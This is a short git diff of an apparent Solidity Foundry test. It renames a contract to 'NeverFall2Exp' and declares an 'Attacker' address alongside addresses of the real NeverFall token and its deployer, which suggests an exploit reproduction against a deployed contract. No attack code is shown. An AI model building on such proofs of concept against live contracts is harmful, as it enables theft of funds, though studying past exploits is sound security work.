@@ -10,7 +10,7 @@ interface INeverFall {
     function sell(uint256 amount) external returns (uint256);
 }
 
-contract NeverFall2 is Test {
+contract NeverFall2Exp is Test {
     address Attacker = address(this);
     address NeverFallDeployer = 0x051d6a5f987e4fc53B458eC4f88A104356E6995a;
     address NeverFall = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;
